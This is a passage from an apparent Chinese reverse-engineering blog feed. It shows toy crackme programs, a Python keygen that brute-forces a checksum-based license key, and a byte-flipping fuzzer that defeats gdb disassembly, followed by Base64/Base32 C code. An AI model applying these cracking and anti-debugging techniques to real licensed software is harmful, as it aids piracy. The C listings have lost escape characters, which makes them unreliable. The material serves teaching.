    <content type="html"><![CDATA[<h1 id="Linux程序破解与反破解"><a href="#Linux程序破解与反破解" class="headerlink" title="Linux程序破解与反破解"></a>Linux程序破解与反破解</h1><h2 id="1-许可证密钥位于二进制文件内"><a href="#1-许可证密钥位于二进制文件内" class="headerlink" title="1. 许可证密钥位于二进制文件内"></a>1. 许可证密钥位于二进制文件内</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>c</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc==<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Checking License: %s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">"AAAA-Z10N-42-OK"</span>)==<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Access Granted!\n"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"WRONG!\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Usage: &lt;key&gt;\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat 1.c</span><br><span class="line">gcc 1.c –o test1</span><br><span class="line">.&#x2F;test1 AAAA-Z10N-42-OK</span><br><span class="line"></span><br><span class="line">Crack：  strings test1</span><br></pre></td></tr></table></figure></div><h2 id="扰乱密钥加密"><a href="#扰乱密钥加密" class="headerlink" title="扰乱密钥加密"></a>扰乱密钥加密</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc==<span class="number">2</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Checking License: %s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(argv[<span class="number">1</span>]); i++) </span><br><span class="line">            &#123;</span><br><span class="line">                sum+= (<span class="keyword">int</span>)argv[<span class="number">1</span>][i];  <span class="comment">//ASCII累加</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Value: %d\n"</span>, sum);</span><br><span class="line">        <span class="keyword">if</span>(sum==<span class="number">916</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Access Granted!\n"</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"WRONG!\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Usage: &lt;key&gt;\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">keygen2.py</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_key</span><span class="params">(key)</span>:</span></span><br><span class="line">    char_sum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> key:</span><br><span class="line">        char_sum += ord(c)</span><br><span class="line">    sys.stdout.write(<span class="string">"&#123;0:3&#125; | &#123;1&#125;      \r"</span>.format(char_sum, key))    <span class="comment"># print</span></span><br><span class="line">    sys.stdout.flush()                                               <span class="comment"># 一秒输出一行</span></span><br><span class="line">    <span class="keyword">return</span> char_sum</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    key += random.choice(<span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"</span>)</span><br><span class="line">    s = check_key(key)</span><br><span class="line">    <span class="keyword">if</span> s &gt; <span class="number">916</span>:</span><br><span class="line">        key = <span class="string">""</span></span><br><span class="line">    <span class="keyword">elif</span> s==<span class="number">916</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Found valid key: &#123;0&#125;"</span>.format(key)</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">将输入key的ASCII累加，与注册码魔术值比较，达到隐藏密钥的效果</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2018/09/15/5b9d1ccc080af.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/15/5b9d1ccc080af.jpg" class="lazyload"></a></p><h2 id="使用FUZZ进行反调试"><a href="#使用FUZZ进行反调试" class="headerlink" title="使用FUZZ进行反调试"></a>使用FUZZ进行反调试</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">"cp test2 test2_fuzz"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flip_byte</span><span class="params">(in_bytes)</span>:</span></span><br><span class="line">    i = random.randint(<span class="number">0</span>,len(in_bytes))</span><br><span class="line">    c = chr(random.randint(<span class="number">0</span>,<span class="number">0xFF</span>))</span><br><span class="line">    <span class="keyword">return</span> in_bytes[:i]+c+in_bytes[i+<span class="number">1</span>:]         <span class="comment"># 随机字符</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copy_binary</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"test2"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> orig_f, open(<span class="string">"test2_fuzz"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> new_f:   <span class="comment"># 二进制复制</span></span><br><span class="line">        new_f.write(flip_byte(orig_f.read()))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compare</span><span class="params">(fn1, fn2)</span>:</span>                                          <span class="comment"># 检查fuzz文件能否运行</span></span><br><span class="line">    <span class="keyword">with</span> open(fn1) <span class="keyword">as</span> f1, open(fn2) <span class="keyword">as</span> f2:</span><br><span class="line">        <span class="keyword">return</span> f1.read()==f2.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_output</span><span class="params">()</span>:</span>                                                           <span class="comment"># 检查文件是否存在</span></span><br><span class="line">    os.system(<span class="string">"(./test2_fuzz ; ./test2_fuzz AAAA-Z10N-42-OK) &gt; fuzz_output"</span>)</span><br><span class="line">    <span class="keyword">return</span> compare(<span class="string">"orig_output"</span>, <span class="string">"fuzz_output"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_gdb</span><span class="params">()</span>:</span></span><br><span class="line">    os.system(<span class="string">"echo disassemble main | gdb test2_fuzz &gt; fuzz_gdb"</span>)           <span class="comment"># 重定向到新文件</span></span><br><span class="line">    <span class="keyword">return</span> compare(<span class="string">"orig_gdb"</span>, <span class="string">"fuzz_gdb"</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">def check_radare():</span></span><br><span class="line"><span class="string">    os.system('echo -e "aaa\ns sym.main\npdf" | radare2 test2_fuzz &gt; fuzz_radare')</span></span><br><span class="line"><span class="string">    return compare("orig_radare", "fuzz_radare")</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    copy_binary()</span><br><span class="line">    <span class="keyword">if</span> check_output() <span class="keyword">and</span> <span class="keyword">not</span> check_gdb(): <span class="comment"># and not check_radare():</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"FOUND POSSIBLE FAIL\n\n\n"</span></span><br><span class="line">        os.system(<span class="string">"tail fuzz_gdb"</span>)</span><br><span class="line">        <span class="comment"># os.system("tail fuzz_radare")</span></span><br><span class="line">        raw_input()</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输出orig二进制文件</span><br><span class="line"></span><br><span class="line">     (.&#x2F;test2_fuzz  ; .&#x2F;test2_fuzz  AAAA-Z10N-42-OK)  &gt;  orig_output</span><br><span class="line">     echo disassemble main | gdb test2_fuzz &gt; orig_gdb</span><br><span class="line"></span><br><span class="line">Fuzz</span><br><span class="line">     .&#x2F;fuzz.py</span><br><span class="line"></span><br><span class="line">验证</span><br><span class="line">    gdb test2_fuzz</span><br><span class="line">    disassemble main</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Linux程序破解与反破解&quot;&gt;&lt;a href=&quot;#Linux程序破解与反破解&quot; class=&quot;headerlink&quot; title=&quot;Linux程序破解与反破解&quot;&gt;&lt;/a&gt;Linux程序破解与反破解&lt;/h1&gt;&lt;h2 id=&quot;1-许可证密钥位于二进制文件内&quot;&gt;&lt;a</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Base-N算法及逆向初探</title>
    <link href="https://kabeor.github.io/Base-N%E7%AE%97%E6%B3%95%E5%8F%8A%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/"/>
    <id>https://kabeor.github.io/Base-N%E7%AE%97%E6%B3%95%E5%8F%8A%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/</id>
    <published>2018-09-06T16:00:00.000Z</published>
    <updated>2020-03-16T04:38:20.274Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Base-N算法及逆向初探"><a href="#Base-N算法及逆向初探" class="headerlink" title="Base-N算法及逆向初探"></a>Base-N算法及逆向初探</h1><p>上次研究了<a href="https://kabeor.cn/CRC%E6%A0%A1%E9%AA%8C%E7%AE%97%E6%B3%95%E5%8F%8A%E9%80%86%E5%90%91%E6%96%B9%E6%B3%95%E5%88%9D%E6%8E%A2/" target="_blank" rel="noopener">CRC校验</a>，这次来看一下Base-N系列的算法吧</p><p>在CTF的算法逆向中Base系列算是最常见的了，各种组合和变体，下面就具体来说说吧。</p><h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><h3 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h3><blockquote><p>Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于2^6=64，所以每6个比特为一个单元，对应某个可打印字符。3个字节有24个比特，对应于4个Base64单元，即3个字节可由4个可打印字符来表示。它可用来作为电子邮件的传输编码。在Base64中的可打印字符包括字母A-Z、a-z、数字0-9，这样共有62个字符，此外两个可打印符号在不同的系统中而不同。一些如uuencode的其他编码方法，和之后BinHex的版本使用不同的64字符集来代表6个二进制数字，但是不被称为Base64。</p><p>Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据，包括MIME的电子邮件及XML的一些复杂数据。           —–维基百科 <a href="https://zh.wikipedia.org/wiki/Base64" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Base64</a></p></blockquote><h4 id="编码规则"><a href="#编码规则" class="headerlink" title="编码规则"></a>编码规则</h4><blockquote><p>第一步，将每三个字节作为一组，一共是24个二进制位<br>第二步，将这24个二进制位分为四组，每个组有6个二进制位<br>第三步，在每组前面加两个00，扩展成32个二进制位，即四个字节<br>第四步，根据下表，得到扩展后的每个字节的对应符号，这就是Base64的编码值</p></blockquote><p><a href="https://i.loli.net/2018/09/07/5b9264fbaee7c.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/07/5b9264fbaee7c.jpg" class="lazyload"></a></p><blockquote><p>如果要编码的字节数不能被3整除，最后会多出1个或2个字节，那么可以使用下面的方法进行处理：先使用0字节值在末尾补足，使其能够被3整除，然后再进行Base64的编码。在编码后的Base64文本后加上一个或两个=号，代表补足的字节数。也就是说，当最后剩余两个八位字节（2个byte）时，最后一个6位的Base64字节块有四位是0值，最后附加上两个等号；如果最后剩余一个八位字节（1个byte）时，最后一个6位的base字节块有两位是0值，最后附加一个等号。 参考下表：</p></blockquote><p><a href="https://i.loli.net/2018/09/07/5b9265e357faa.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/07/5b9265e357faa.jpg" class="lazyload"></a></p><h4 id="C代码实现"><a href="#C代码实现" class="headerlink" title="C代码实现"></a>C代码实现</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &quot;string.h&quot;   </span><br><span class="line">#include &quot;stdlib.h&quot;</span><br><span class="line"></span><br><span class="line">const char base[] &#x3D; &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&#x3D;&quot;; </span><br><span class="line">static char find_pos(char ch);</span><br><span class="line">char *base64_encode(const char* data, int data_len,int *len);</span><br><span class="line">char *base64_decode(const char* data, int data_len,int *len);   </span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> *找到ch在base中的位置 </span><br><span class="line"> *&#x2F;</span><br><span class="line">static char find_pos(char ch)    </span><br><span class="line">&#123;   </span><br><span class="line">    &#x2F;&#x2F;the last position (the only) in base[] </span><br><span class="line">    char *ptr &#x3D; (char*)strrchr(base, ch);  </span><br><span class="line">    return (ptr - base);   </span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> *BASE64编码 </span><br><span class="line"> *&#x2F;</span><br><span class="line">char *base64_encode(const char* data, int data_len,int *len)   </span><br><span class="line">&#123;      </span><br><span class="line">    int prepare &#x3D; 0;   </span><br><span class="line">    int ret_len;   </span><br><span class="line">    *len&#x3D;0;</span><br><span class="line">    int temp &#x3D; 0;   </span><br><span class="line">    char *ret &#x3D; NULL;   </span><br><span class="line">    char *f &#x3D; NULL;   </span><br><span class="line">    int tmp &#x3D; 0;   </span><br><span class="line">    char changed[4];   </span><br><span class="line">    int i &#x3D; 0;   </span><br><span class="line">    ret_len &#x3D; data_len &#x2F; 3;   </span><br><span class="line">    temp &#x3D; data_len % 3;   </span><br><span class="line">    if (temp &gt; 0)   </span><br><span class="line">    &#123;   </span><br><span class="line">        ret_len +&#x3D; 1;   </span><br><span class="line">    &#125;   </span><br><span class="line">    &#x2F;&#x2F;最后一位以&#39;&#39;结束  </span><br><span class="line">    ret_len &#x3D; ret_len*4 + 1;   </span><br><span class="line">    ret &#x3D; (char *)malloc(ret_len);   </span><br><span class="line"></span><br><span class="line">    if ( ret &#x3D;&#x3D; NULL)   </span><br><span class="line">    &#123;   </span><br><span class="line">        printf(&quot;No enough memory.n&quot;);   </span><br><span class="line">        exit(0);   </span><br><span class="line">    &#125;   </span><br><span class="line">    memset(ret, 0, ret_len);   </span><br><span class="line">    f &#x3D; ret; </span><br><span class="line">    &#x2F;&#x2F;tmp记录data中移动位置   </span><br><span class="line">    while (tmp &lt; data_len)   </span><br><span class="line">    &#123;   </span><br><span class="line">        temp &#x3D; 0;   </span><br><span class="line">        prepare &#x3D; 0;   </span><br><span class="line">        memset(changed, 0, 4);   </span><br><span class="line">        while (temp &lt; 3)   </span><br><span class="line">        &#123;      </span><br><span class="line">            if (tmp &gt;&#x3D; data_len)   </span><br><span class="line">            &#123;   </span><br><span class="line">                break;   </span><br><span class="line">            &#125;  </span><br><span class="line">            &#x2F;&#x2F;将data前8*3位移入prepare的低24位  </span><br><span class="line">            prepare &#x3D; ((prepare &lt;&lt; 8) | (data[tmp] &amp; 0xFF));   </span><br><span class="line">            tmp++;   </span><br><span class="line">            temp++;   </span><br><span class="line">        &#125;   </span><br><span class="line">        &#x2F;&#x2F;将有效数据移到以prepare的第24位起始位置 </span><br><span class="line">        prepare &#x3D; (prepare&lt;&lt;((3-temp)*8));   </span><br><span class="line"></span><br><span class="line">        for (i &#x3D; 0; i &lt; 4 ;i++ )   </span><br><span class="line">        &#123;   </span><br><span class="line">            &#x2F;&#x2F;最后一位或两位 </span><br><span class="line">            if (temp &lt; i)   </span><br><span class="line">            &#123;   </span><br><span class="line">                changed[i] &#x3D; 0x40;   </span><br><span class="line">            &#125;   </span><br><span class="line">            else</span><br><span class="line">            &#123;   </span><br><span class="line">                &#x2F;&#x2F;24位数据 </span><br><span class="line">                changed[i] &#x3D; (prepare&gt;&gt;((3-i)*6)) &amp; 0x3F;   </span><br><span class="line">            &#125;   </span><br><span class="line">            *f &#x3D; base[changed[i]];   </span><br><span class="line"></span><br><span class="line">            f++; </span><br><span class="line">            (*len)++;  </span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;   </span><br><span class="line">    *f &#x3D; &#39;&#39;;   </span><br><span class="line"></span><br><span class="line">    return ret;   </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> *BASE64解码 </span><br><span class="line"> *&#x2F;</span><br><span class="line">char *base64_decode(const char *data, int data_len,int *len)   </span><br><span class="line">&#123;   </span><br><span class="line">    int ret_len &#x3D; (data_len &#x2F; 4) * 3+1;   </span><br><span class="line">    int equal_count &#x3D; 0;   </span><br><span class="line">    char *ret &#x3D; NULL;   </span><br><span class="line">    char *f &#x3D; NULL;   </span><br><span class="line">    *len&#x3D;0;</span><br><span class="line">    int tmp &#x3D; 0;   </span><br><span class="line">    int temp &#x3D; 0;   </span><br><span class="line">    char need[3];   </span><br><span class="line">    int prepare &#x3D; 0;   </span><br><span class="line">    int i &#x3D; 0;   </span><br><span class="line">    if (*(data + data_len - 1) &#x3D;&#x3D; &#39;&#x3D;&#39;)   </span><br><span class="line">    &#123;   </span><br><span class="line">        equal_count +&#x3D; 1;   </span><br><span class="line">    &#125;   </span><br><span class="line">    if (*(data + data_len - 2) &#x3D;&#x3D; &#39;&#x3D;&#39;)   </span><br><span class="line">    &#123;   </span><br><span class="line">        equal_count +&#x3D; 1;   </span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    ret &#x3D; (char *)malloc(ret_len);   </span><br><span class="line">    if (ret &#x3D;&#x3D; NULL)   </span><br><span class="line">    &#123;   </span><br><span class="line">        printf(&quot;No enough memory.n&quot;);   </span><br><span class="line">        exit(0);   </span><br><span class="line">    &#125;   </span><br><span class="line">    memset(ret, 0, ret_len);   </span><br><span class="line">    f &#x3D; ret;   </span><br><span class="line">    while (tmp &lt; (data_len - equal_count))   </span><br><span class="line">    &#123;   </span><br><span class="line">        temp &#x3D; 0;   </span><br><span class="line">        prepare &#x3D; 0;   </span><br><span class="line">        memset(need, 0, 4);   </span><br><span class="line">        while (temp &lt; 4)   </span><br><span class="line">        &#123;   </span><br><span class="line">            if (tmp &gt;&#x3D; (data_len - equal_count))   </span><br><span class="line">            &#123;   </span><br><span class="line">                break;   </span><br><span class="line">            &#125;   </span><br><span class="line">            prepare &#x3D; (prepare &lt;&lt; 6) | (find_pos(data[tmp]));   </span><br><span class="line">            temp++;   </span><br><span class="line">            tmp++;   </span><br><span class="line">        &#125;   </span><br><span class="line">        prepare &#x3D; prepare &lt;&lt; ((4-temp) * 6);   </span><br><span class="line">        for (i&#x3D;0; i&lt;3 ;i++ )   </span><br><span class="line">        &#123;   </span><br><span class="line">            if (i &#x3D;&#x3D; temp)   </span><br><span class="line">            &#123;   </span><br><span class="line">                break;   </span><br><span class="line">            &#125;   </span><br><span class="line">            *f &#x3D; (char)((prepare&gt;&gt;((2-i)*8)) &amp; 0xFF);   </span><br><span class="line">            f++;</span><br><span class="line">            (*len)++;   </span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">    *f &#x3D; &#39;&#39;; </span><br><span class="line">    if(data[data_len-1]&#x3D;&#x3D;&#39;&#x3D;&#39;)</span><br><span class="line">    &#123;</span><br><span class="line">        (*len)--;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;*</span><br><span class="line">    while(*(--f)&#x3D;&#x3D;&#39;&#39;)</span><br><span class="line">    &#123;</span><br><span class="line">      (*len)--;</span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line">    *&#x2F;</span><br><span class="line">    return ret;   </span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    char *former &#x3D; &quot;hello&quot;;</span><br><span class="line">    int len1,len2;</span><br><span class="line">    printf(&quot;%sn&quot;,former);</span><br><span class="line">    char *after &#x3D; base64_encode(former, 5,&amp;len1);</span><br><span class="line">    printf(&quot;%d %sn&quot;,len1,after);</span><br><span class="line">    former &#x3D; base64_decode(after, len1,&amp;len2);</span><br><span class="line">    printf(&quot;%d %sn&quot;,len2,former);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>逆向识别后面一块说，先来看看Base32吧</p><h3 id="Base32"><a href="#Base32" class="headerlink" title="Base32"></a>Base32</h3><h4 id="编码规则-1"><a href="#编码规则-1" class="headerlink" title="编码规则"></a>编码规则</h4><p> Base32这种数据编码机制，主要用来把二进制数据编码成可见的字符串，其编码规则是：任意给定一个二进制数据，以5个位(bit)为一组进行切分(base64以6个位(bit)为一组)，对切分而成的每个组进行编码得到1个可见字符。Base32编码表字符集中的字符总数为25=32个，这也是Base32名字的由来。</p><p> 下面是Base32的table</p><p> <a href="https://i.loli.net/2018/09/07/5b926bef87d6a.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/07/5b926bef87d6a.jpg" class="lazyload"></a></p><h4 id="C代码实现-1"><a href="#C代码实现-1" class="headerlink" title="C代码实现"></a>C代码实现</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;base32 表包含 0~9 以及小写字母 (去除&#39;a&#39;,&#39;i&#39;,&#39;l&#39;,&#39;o&#39;)，</span><br><span class="line">&#x2F;&#x2F;共 32 个字符</span><br><span class="line">static const char base32_alphabet[32] &#x3D; &#123;</span><br><span class="line">        &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;,</span><br><span class="line">        &#39;8&#39;, &#39;9&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;,</span><br><span class="line">        &#39;h&#39;, &#39;j&#39;, &#39;k&#39;, &#39;m&#39;, &#39;n&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;,</span><br><span class="line">        &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"> * 匹配 base32_alphabet</span><br><span class="line"> *&#x2F;</span><br><span class="line">int find_number(char m) &#123;</span><br><span class="line">    int i;</span><br><span class="line">    for(i &#x3D; 0; i &lt; 32; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        if(m &#x3D;&#x3D; base32_alphabet[i])</span><br><span class="line">            return i;</span><br><span class="line">    &#125;</span><br><span class="line">    return -1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"> * base32 编码</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">char* base32_encode(char *bin_source)&#123;</span><br><span class="line">    int i;</span><br><span class="line">    int j &#x3D; 0;</span><br><span class="line">    static char str[10];</span><br><span class="line"></span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(bin_source);++i)&#123;</span><br><span class="line">        if((i+1)%5&#x3D;&#x3D;0)&#123;</span><br><span class="line">            j++;</span><br><span class="line">            int num &#x3D; (bin_source[i]-&#39;0&#39;)+(bin_source[i-1]-&#39;0&#39;)*2\</span><br><span class="line">            +(bin_source[i-2]-&#39;0&#39;)*2*2+(bin_source[i-3]-&#39;0&#39;)*2*2*2\</span><br><span class="line">            +(bin_source[i-4]-&#39;0&#39;)*2*2*2*2;</span><br><span class="line"></span><br><span class="line">            str[j-1] &#x3D; base32_alphabet[num];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    return str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"> * base32 解码</span><br><span class="line"> *&#x2F;</span><br><span class="line">int* base32_decode(char *str_source)&#123;</span><br><span class="line">    int i,j;</span><br><span class="line">    static int dec[50];</span><br><span class="line">    int count&#x3D;0;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(str_source);++i)&#123;</span><br><span class="line">        for(j&#x3D;5-1;j&gt;&#x3D;0;--j)&#123;</span><br><span class="line">            count++;</span><br><span class="line">            &#x2F;&#x2F;位运算十进制转二进制</span><br><span class="line">            dec[count-1] &#x3D; find_number(str_source[i])&gt;&gt;(j%5)&amp;1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return dec;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" 